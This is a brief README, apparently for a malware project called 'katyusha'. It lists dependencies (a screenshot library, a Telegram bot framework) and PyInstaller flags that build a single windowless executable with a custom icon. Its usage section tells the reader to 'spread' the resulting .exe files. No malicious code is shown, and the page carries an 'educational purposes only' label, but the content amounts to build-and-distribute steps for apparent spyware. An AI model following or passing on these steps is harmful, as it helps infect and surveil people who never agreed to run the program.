# :information_source: EDUCATIONAL PURPOSES ONLY

### Development Setup

```pip install pyscreenshot```

```pip install aiogram ujson aiohttp[speedups]```

```pip install uvloop``` ___ **NOT SUPPORTED BY WINDOWS**

```pip install pyinstaller```

```pip install pyzmq```

```npm install pm2@latest -g```

```pm2 start katpy/katyusha.py```

```cd katrust && cargo run``` 

### Build on Python

```pyinstaller --onefile --windowed --icon=katyusha.ico katpy/katyusha.py```

### Build on Rust
```cd katrust && cargo run --bin katyusha --release```

### Usage

Spread ```katyusha.exe``` inside `katpy/dist` or ```katrust.exe``` inside `katrust/target/release` folder. 
